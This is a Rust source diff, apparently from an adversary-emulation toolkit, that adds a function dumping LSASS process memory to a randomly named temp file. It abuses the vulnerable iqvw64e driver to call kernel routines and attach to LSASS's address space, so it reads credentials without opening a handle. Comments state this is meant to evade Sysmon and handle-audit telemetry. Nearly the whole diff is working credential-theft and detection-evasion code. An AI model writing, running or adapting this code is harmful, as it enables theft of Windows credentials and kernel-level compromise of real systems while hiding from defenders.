@@ -2587,6 +2587,234 @@ pub fn kernel_exec() -> Result<Vec<u8>, String> {
     .into_bytes())
 }
 
+// ---------------------------------------------------------------------------
+// ABR-T033: LSASS dump through address-space attachment, NO lsass handle.
+// ---------------------------------------------------------------------------
+
+/// Dumps `pid` (LSASS) to %TEMP%\<random>.tmp without ever opening a
+/// handle to it: the iqvw64e call trampoline (T017) performs
+/// KeStackAttachProcess on this thread; while attached the thread's
+/// address space IS lsass's, so the region walk (NtQueryVirtualMemory
+/// on the current-process pseudo handle) and every data read run as
+/// ORDINARY USER-MODE accesses. KeUnstackDetachProcess always runs
+/// before any fallible follow-up. No Sysmon EID 10, no handle audit —
+/// the documented telemetry gap of this variant.
+pub fn kernel_attach_dump(pid: u64) -> Result<String, String> {
+    let driver = Iqvw64e::open().map_err(|e| format!("no Nal device: {e}"))?;
+    let base = ntoskrnl_base()?;
+    let read64 = |a: u64| driver.read64(a);
+    let export = |name: &str| -> Result<u64, String> {
+        Ok(base + kernel_export_rva(read64, base, name)? as u64)
+    };
+    let ke_attach = export("KeStackAttachProcess")?;
+    let ke_detach = export("KeUnstackDetachProcess")?;
+    let ex_alloc = export("ExAllocatePoolWithTag")?;
+    let ex_free = export("ExFreePool")?;
+
+    // Target EPROCESS through the proven elevate() recipe.
+    let psis_rva = kernel_export_rva(read64, base, "PsInitialSystemProcess")?;
+    let system_eproc = driver.read64(base + psis_rva as u64)?;
+    if system_eproc < 0xFFFF_8000_0000_0000 {
+        return Err(format!(
+            "PsInitialSystemProcess implausible: {system_eproc:#x}"
+        ));
+    }
+    let my_pid = std::process::id();
+    let links_off = discover_links_offset(read64, system_eproc, my_pid)?;
+    let target_eproc = try_walk(read64, system_eproc, links_off, pid as u32)?;
+
+    const POOL_NON_PAGED: u64 = 0;
+    const TAG_ABR: u64 = 0x52_42_72_41; // 'ArBR'
+    let kapc = driver.call(ex_alloc, POOL_NON_PAGED, 0x100, TAG_ABR, 0)?;
+    if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&kapc) {
+        return Err(format!("KAPC_STATE pool implausible: {kapc:#x}"));
+    }
+
+    let attach_status = driver.call(ke_attach, target_eproc, kapc, 0, 0)?;
+    if attach_status as u32 & 0x8000_0000 != 0 {
+        // The stub jmps; a failing NTSTATUS here is unexpected — but if
+        // the attach did NOT land, detaching is harmless.
+        let _ = driver.call(ke_detach, kapc, 0, 0, 0);
+        let _ = driver.call(ex_free, kapc, 0, 0, 0);
+        return Err(format!(
+            "KeStackAttachProcess returned {attach_status:#010x}"
+        ));
+    }
+
+    // Attached: capture everything in user mode; failures defer to the
+    // detach below via the captured Result.
+    let captured = attached_capture(pid);
+
+    // Detach FIRST — the one state this technique must never leave.
+    let detach_status = driver.call(ke_detach, kapc, 0, 0, 0)?;
+    let free_status = driver.call(ex_free, kapc, 0, 0, 0).unwrap_or(0);
+    if detach_status as u32 & 0x8000_0000 != 0 {
+        return Err(format!(
+            "KeUnstackDetachProcess returned {detach_status:#010x} — the thread MUST be considered detached-abandoned; report this"
+        ));
+    }
+    if free_status as u32 & 0x8000_0000 != 0 {
+        // Leak, not a correctness issue; note it in the result.
+        eprintln!("[!] T033: KAPC_STATE pool free failed (leaked 0x100 bytes)");
+    }
+
+    let (modules, regions) = captured?;
+    let dump = crate::cred::build_minidump(&modules, &regions)?;
+    let temp = std::env::var("TEMP").map_err(|_| "TEMP unresolved".to_string())?;
+    let path = format!("{}\\{:016x}.tmp", temp, rand::random::<u64>());
+    std::fs::write(&path, &dump).map_err(|e| format!("write {path}: {e}"))?;
+    Ok(path)
+}
+
+const MBI_MEM_COMMIT: u32 = 0x1000;
+const MBI_PAGE_NOACCESS: u32 = 0x01;
+const MBI_PAGE_GUARD: u32 = 0x100;
+const MBI_MEM_IMAGE: u32 = 0x100_000;
+const MBI_MEM_PRIVATE: u32 = 0x20_000;
+
+/// Region/module capture while the thread is attached to the target:
+/// NtQueryVirtualMemory(current) walks the (now target) address space;
+/// image regions parse their in-memory PE header for the module list.
+/// Every read stays inside committed, non-guard, readable ranges.
+fn attached_capture(
+    _pid: u64,
+) -> Result<(Vec<crate::cred::ModuleInfo>, Vec<crate::cred::Region>), String> {
+    let query = unsafe { syscalls::resolve("NtQueryVirtualMemory") }
+        .ok_or("NtQueryVirtualMemory unresolved")?;
+    let current: usize = usize::MAX; // NtCurrentProcess pseudo handle
+    let mut regions = Vec::new();
+    let mut image_bases: Vec<u64> = Vec::new();
+    let mut address: u64 = 0x1_0000;
+    loop {
+        let mut info = [0u8; 48];
+        let mut returned = 0usize;
+        let status = unsafe {
+            syscalls::dispatch6(
+                query,
+                current,
+                address as usize,
+                0, // MemoryBasicInformation
+                info.as_mut_ptr() as usize,
+                info.len(),
+                &mut returned as *mut usize as usize,
+            )
+        };
+        if (status as u32) & 0x8000_0000 != 0 {
+            break; // past the highest mapped address
+        }
+        let field =
+            |off: usize| -> u64 { u64::from_le_bytes(info[off..off + 8].try_into().unwrap()) };
+        let word =
+            |off: usize| -> u32 { u32::from_le_bytes(info[off..off + 4].try_into().unwrap()) };
+        let region_base = field(0);
+        let region_size = field(24) as usize;
+        let state = word(32);
+        let protect = word(36);
+        let region_type = word(40);
+        if state == MBI_MEM_COMMIT
+            && protect & (MBI_PAGE_NOACCESS | MBI_PAGE_GUARD) == 0
+            && region_size > 0
+            && region_base < 0x0000_7FFF_FFFF_FFFF
+            && (region_type == MBI_MEM_PRIVATE || region_type == MBI_MEM_IMAGE)
+        {
+            let data = read_user(region_base, region_size);
+            if let Some(data) = data {
+                if region_type == MBI_MEM_IMAGE && looks_like_pe(region_base) {
+                    image_bases.push(region_base);
+                }
+                regions.push(crate::cred::Region {
+                    base: region_base,
+                    size: region_size,
+                    data,
+                });
+            }
+        }
+        if region_size == 0 {
+            break;
+        }
+        address = region_base.wrapping_add(region_size as u64);
+        if address >= 0x0000_7FFF_FFFF_FFFF {
+            break;
+        }
+    }
+    // Module list from the captured image regions' PE headers.
+    let mut modules = Vec::new();
+    let find_region = |base: u64| regions.iter().find(|r| r.base == base);
+    for base in image_bases {
+        let Some(first) = find_region(base) else {
+            continue;
+        };
+        let data = &first.data;
+        if data.len() < 0x40 {
+            continue;
+        }
+        let e_lfanew = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
+        if e_lfanew + 0x120 > data.len() {
+            continue; // header not inside the first region chunk
+        }
+        if &data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
+            continue;
+        }
+        let size_of_image =
+            u32::from_le_bytes(data[e_lfanew + 0x50..e_lfanew + 0x54].try_into().unwrap());
+        let export_rva =
+            u32::from_le_bytes(data[e_lfanew + 0x118..e_lfanew + 0x11C].try_into().unwrap()) as u64;
+        let mut name = format!("module_{base:x}");
+        if export_rva != 0 {
+            if let Some(text) = pe_export_name(base, export_rva, &regions) {
+                name = text;
+            }
+        }
+        modules.push(crate::cred::ModuleInfo {
+            base,
+            size: size_of_image,
+            name,
+        });
+    }
+    if regions.is_empty() {
+        return Err("attached capture found no regions — attach likely failed silently".into());
+    }
+    Ok((modules, regions))
+}
+
+/// Direct user-mode read while attached; None on any fault-shaped doubt.
+fn read_user(base: u64, size: usize) -> Option<Vec<u8>> {
+    // 16 MB cap per region: gigantic mapped views (e.g. AWE) are not
+    // credential-bearing and would balloon the dump.
+    const REGION_CAP: usize = 16 * 1024 * 1024;
+    let size = size.min(REGION_CAP);
+    let mut out = vec![0u8; size];
+    let src = base as *const u8;
+    // Region was MBI-verified committed+readable a moment ago; the
+    // copy is a plain load sequence against the attached space.
+    unsafe {
+        for (i, slot) in out.iter_mut().enumerate() {
+            *slot = *src.add(i);
+        }
+    }
+    Some(out)
+}
+
+fn looks_like_pe(base: u64) -> bool {
+    unsafe { !(base as *const u16).is_null() && *(base as *const u16) == 0x5A4D }
+}
+
+/// Resolves a module's export-directory name across the region map.
+fn pe_export_name(base: u64, export_rva: u64, regions: &[crate::cred::Region]) -> Option<String> {
+    let read_bytes = |addr: u64, len: usize| -> Option<Vec<u8>> {
+        let region = regions
+            .iter()
+            .find(|r| addr >= r.base && addr < r.base + r.data.len() as u64)?;
+        let offset = (addr - region.base) as usize;
+        region.data.get(offset..offset + len).map(|s| s.to_vec())
+    };
+    let dir = read_bytes(base + export_rva, 40)?;
+    let name_rva = u32::from_le_bytes(dir[12..16].try_into().ok()?) as u64;
+    let raw = read_bytes(base + name_rva, 64)?;
+    let end = raw.iter().position(|b| *b == 0).unwrap_or(raw.len());
+    Some(String::from_utf8_lossy(&raw[..end]).into_owned())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
